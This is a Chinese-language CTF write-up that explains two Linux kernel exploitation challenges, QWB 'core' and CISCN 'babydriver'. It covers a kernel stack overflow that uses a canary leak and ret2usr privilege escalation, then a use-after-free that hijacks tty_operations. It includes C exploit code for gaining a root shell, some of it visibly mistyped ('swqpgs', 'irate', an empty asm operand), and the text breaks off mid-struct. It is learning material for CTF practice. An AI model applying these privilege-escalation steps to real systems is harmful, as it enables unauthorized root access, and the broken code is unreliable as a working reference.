
# [原创]linux kernel pwn 分析(一) 强网杯core + ciscn babydriver

作为一个`kernel pwn`刚刚入门的同学，想着分享一下自己的经验，这几道`kernel pwn`的题目当时比赛的时候没有做出来，后来对照着大佬的write up复现了一波，仔细研究了一下。准备分析`core` `babydriver` `solid_core`这三道题，如果能弄懂了这三道题入门应该没问题了。

第一篇文章讲`core` 和 `babydriver`

第二篇文章讲 `solid_core`(因为很难所以单独一篇文章分析)

第三篇文章讲一下`linux kernel` 堆分配 `slub`分配器和内核堆溢出的例子

首先讲一点准备知识：

## 准备知识
### 附件已经上传，使用 分别使用cat core* | tar xzvf - 和 cat babydriver* | tar xzvf -进行解压就可以了，大佬们的exp也包含在里面
### 如何起系统？
`ctf`的`kernel pwn`中一般会给出`qemu`起系统的脚本 随便举一例

```
qemu-system-x86_64 \
-m 256M \
-kernel ./bzImage \
-initrd ./initrd.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr" \
-cpu qemu64,+smep,+smap \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-s \
-nographic -enable-kvm \
```

比较重要的是`qemu-system-x86`制定处理器体系，

`-m`指定内存，

`-s`选项默认指定 开启更`gdb`远程调试端口 `1234`

### 比较常见的如何解包？
```
$ mkdir core
$ mv core.cpio ./core/core.cpio.gz
$ cd core
$ gunzip core.cpio.gz
$ cpio -idmv < core.cpio
```
这个时候，将`exp`放入系统的一个目录中

```
$ nano init
```
这条命令用于编辑`init`，一般用于删除定时关机

```
$find . | cpio -o -H newc | gzip > ../core.cpio
```
用于重新打包 也可以用这几条：

```
$ ./gen_cpio.sh core.cpio
$ mv core.cpio ../core.cpio
$ cd ..
$ rm -rf core
```

### gdb调试的时候遇到一些问题：
`target remote:1234` 这个时候如果返回一堆字符显示过长，

`set architecture i386:x86-64:intel` 使用这条命令设置架构

在运行时载入模块的符号表：

```
grep 0 /sys/module/your_module/sections/.text
add-symbol-file ./your_module.ko text
```
其中`your_module`是你要加载的驱动模块，

`text`为第一行命令的返回值。

### 如何得到kernel rop
如果有`ELF`形式的`vmlinux`映像可以直接用`ROPgadgets`，但更多时候我们只有`bzImage`，这个时候需要用`extract-vmlinux`进行提权，它在内核源码的`scripts`中，搜索自己`linux`系统的内核源码就能找到。

强网杯一共有两道`kernel pwn`题，`solid_core`网上有出题人详细的思路讲解

首先看最简单的一道题 `core`，是入门级别的一个简单的内核栈溢出，关于内核栈溢出，我认为和用户态的栈溢出在本质上是一样的，只是在此基础上需要做很多准备工作，保证在内核态实现提权之后返回用户态系统不会崩溃，从而可以成功的拿到`root`权限的`shell`

首先，我们来看题目给出了`core.ko`驱动文件，将它放入`ida`中，![](https://bbs.kanxue.com/upload/attach/202002/799291_JY9G7ZCBNUJCPFG.jpeg)

## core 分析
### 如何leak canary？
可以看出这是出题人自行实现的`ioctl`系统，是`kernel`中比较常见的一种类型，`f5`一下：

看到`core_read`函数中，在`copy_to_user`调用时`v6+off`，可以用来`leak canary`，查看`core_read`的汇编代码，出入的`rsi`参数是`v6`，为`rsp`，`canary`的值在`rsp+0x40`处，因此，只要将`off`的值设置为`0x40`，读出的第一个值即为`canary`值。![](https://bbs.kanxue.com/upload/attach/202002/799291_9KXKRA53SV3V3P5.jpeg)

![](https://bbs.kanxue.com/upload/attach/202002/799291_VJ4E9X66PZ35XP7.jpeg)

### 如何设置off?
首先看`module_init` 创建了一个`proc`文件，`ioctl`具体源码的分析留到本文的下半部分分析，因为`babydriver`的利用会用到。现在只需要知道，`ioctl`系统调用会根据传入的文件描述符去调用文件自己定义的`ioctl`系统，在这里就是`core_ioctl`。`ioctl`总共有三条指令，当传入的指令为`0x6677889C`的时候，会将传入的值设置为`off`

![](https://bbs.kanxue.com/upload/attach/202002/799291_6DSSNA2JH9MQ499.jpeg)

### 溢出点在哪？
现在可以设置`off`了，也就可以`leak canary`，再来看栈上的溢出点

`core_ioctl`接受的指令为`0x6677889A`时，调用`core_copy_func`，`f5`看起源码，发现存在一个整数的有符号和无符号之间错用的问题，传入的参数`a1`为`signed int`，与`63`进行比较，而在`qmemcpy`的时候，又转化为`unsigned int`，因此只要开始传入`a1`为负数，即可过检查，并且转化为`unsigned`的时候会变成大整数，即可实现将`name`中的值覆盖栈上的返回值。

![](https://bbs.kanxue.com/upload/attach/202002/799291_BJXTHQQZ7PWK6T3.jpeg)

### name如何设置？
可以看到驱动还定义了`core_write`函数，并没有检查`size`，直接写入`name`

![](https://bbs.kanxue.com/upload/attach/202002/799291_KJFJFXUAGXEMG9P.jpeg)

因此本题的总体思路如下：

首先设置`off`；

之后通过`core_read` leak `canary`；

然后通过`write`将`payload`写入`name`全局变量；

最后通过`core_copy`栈溢出劫持控制流；

控制流我们已可以经劫持了，用户态的`pwn`只要再弹一个`shell`即可完成利用

但内核态还需要更多的操作保证系统的稳定性。

我们劫持的控制流是进入内核态的，拥有特权，因此可以完成提权。

通用的提权代码是

```
commit_creds(prepare_kernel_cred(0));
```

### 这两个函数如何动态获得？
借助`/proc/kallsyms`符号表，在运行时动态读取。这个很容易实现，贴出一例：

```
unsigned long find_symbol_by_proc(char *file_name, char *symbol_name)
{
    FILE *s_fp;
    char buff[200] = {0};
    char *p = NULL;
    char *p1 = NULL;
    unsigned long addr = 0;
    s_fp = fopen(file_name, "r");
    if (s_fp == NULL){
        printf("open %s failed.\n", file_name);
        return 0;
    }
    while (fgets(buff, 200, s_fp) != NULL){
        if (strstr(buff, symbol_name) != NULL){
            buff[strlen(buff) - 1] = '\0';
            p = strchr(strchr(buff, ' ') + 1, ' ');
            ++p;
            if (!p) {
                return 0;
            }
            if (!strcmp(p, symbol_name)){
                p1 = strchr(buff, ' ');
                *p1 = '\0';
                sscanf(buff, "%lx", &addr);
                //addr = strtoul(buff, NULL, 16);
                printf("[+] found %s addr at 0x%x.\n",symbol_name, addr);
                break;
            }
        }
    }
```

之后我们需要稳定系统，在内核返回用户态的时候，会调用`iretq`

`iretq`会依次弹出 `rip cs eflags rsp ss`之后做一些判断，因此如果不能构造好这些参数，系统会崩溃，无法`get root shell`。我们采取的方法是：提前构造一个`save_state()`函数，进入内核态前存储这些参数，用来构造`payload`。

```
static void save_state()
{
        asm(
            "movq %%cs, %0;"
            "movq %%ss, %1;"
            "pushfq;"
            "pop %2;"
            : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflag)
            :
            : "memory");
}
```

很简单的一个函数，将`cs ss eflag` 分别存储在三个我们自定义的变量中。至于`rip`和`rsp`则是要我们自己去构造为`getshell` 的`rip`。这样返回用户态之后回去指向`system("/bin/sh")`。

```
int main()
{
        if((base = mmap(0, 0x40000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0))==NULL)
        {
                perror("mmap");
                exit(0);
        }
        int fd;
        char tmp[64];
        fd = open("/proc/core",O_RDWR);
        ioctl(fd,COMMAND_PRINT,0x40);
        ioctl(fd,COMMAND_READ,&tmp);
        memcpy(&canary, tmp, 8);
        char payload[] = {
                0,0,0,0,0,0,0,0,
                canary,
                base+0x20000,
                shellcode
        };
        write(fd, payload, 160);
        ioctl(fd, IOCTL_COMMAND_COPY, 0xff00000000000008);
        return 0;
}
```

`main`函数首先`mmap`一块地址，用来作为伪造栈。这题中返回用户态之后的伪造栈是什么没有影响。可以看到在调用`core_copy`之后劫持控制流去指向`shel lcode()`，

```
static void shellcode()
{
        commit_creds(prepare_kernel_cred(0));
        asm(
            "swqpgs;"\\
            "movq %0 %%rax;"
            "push %%rax;"
            "movq %1 %%rax;"
            "push %%rax;"
            "movq %2 %%rax;"
            "push %%rax;"
            "movq %3 %%rax;"
            "push %%rax;"
            "movq %4 %%rax;"
            "push %%rax;"
            "irate;"
            :
            :"r"(user_ss),"r"()\\,"r"(user_eflags),"r"(user_cs),"r"(get_shell)
            :"memory"
            );
}
```

`shel lcode`首先实现提权，之后构造栈稳固程序，返回用户态。这个时候我们可以看到`rip`的位置是我们的`get_shell`函数指针，`getshell`中调用`system`，因此返回后可以在`root`权限下弹出`shell`，利用完成。

之后通过开头的解包方法先去掉定时`shutdown`，之后将`exp`放入系统，`qemu`起系统，实现提权。

![](https://bbs.kanxue.com/upload/attach/202002/799291_T8NJVF33WKHJ2GR.jpeg)

通过`core`这题我们可以发现，`kernel pwn`比用户态的`pwn`多了很多的准备工作，`kernel pwn`除了栈溢出和堆溢出还有条件竞争，`babydriver` 是一个简单的全局变量的竞争问题：

## babydriver 分析
照例先放入`ida`进行分析，同样实现了一套`ioctl`系统，

首先是`babydriver_init`中，调用了`device_create`，创建了叫`babydev`的文件系统

`babyioctl`中定义了一条命令 `command 65537`

它将会释放掉全局变量`babydev_struct`中的自定义的`buf`，重新申请一块，按照用户重新传入的`size`，然后更新`len`。

![](https://bbs.kanxue.com/upload/attach/202002/799291_34T7TWZQEQ99D8Z.jpeg)

### 下面进行分析每一个设备操作函数，找出漏洞点：
`babyopen`：

调用`kmalloc_caches`申请一块堆空间，关于`linux kernel` 的对管理，会在第三篇文章单独进行分析。申请的内存空间的大小为`64`字节，讲地址存储在`device_buf`，并将全局变量`babydev_struct`的`device_buf_len`更新为`64`。

![](https://bbs.kanxue.com/upload/attach/202002/799291_G4KQJT76GPPNHC7.jpeg)

再看`babywrite`和`babyread`函数

`babywrite` 函数中在调用`copy_from_user`之前会检查`device_buf_len`是否大于用户要求的长度，否则不会执行

![](https://bbs.kanxue.com/upload/attach/202002/799291_2PHMSJHNEC8PNHG.jpeg)

![](https://bbs.kanxue.com/upload/attach/202002/799291_Z8QZRG3S7DQQK9S.jpeg)

同理`babyread`函数也会进行检查，也就是说不存在内存的溢出点。

这个时候我们想起了全局变量，如果我们能够打开两个设备文件描述符，第二个文件描述符再调用`command`更新，为某大小，之后将其释放，这时，我们还有另一个文件描述符，可以对其进行写，实现`use after free`的利用

### 更新的size应该设置为多大？
我们这里要利用一种设备 `tty` 通过打开`'/dev/ptmx'`来进行操作，通过改写`tty_struct`的`tty_opreations`结构体 `*ops`中国`ioctl`函数指针从而劫持控制流

`tty_operations` 结构体如下，只需要在`exp`中声明一个结构体，并将其中的

```
struct tty_operations {
struct tty_struct * (*lookup)(struct tty_driver *driver,
struct file *filp, int idx);
int (*install)(struct tty_driver *driver, struct tty_struct *tty);
void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
int (*open)(struct tty_struct * tty, struct file * filp);
void (*close)(struct tty_struct * tty, struct file * filp);
void (*shutdown)(struct tty_struct *tty);
void (*cleanup)(struct tty_struct *tty);
int (*write)(struct tty_struct * tty,
```
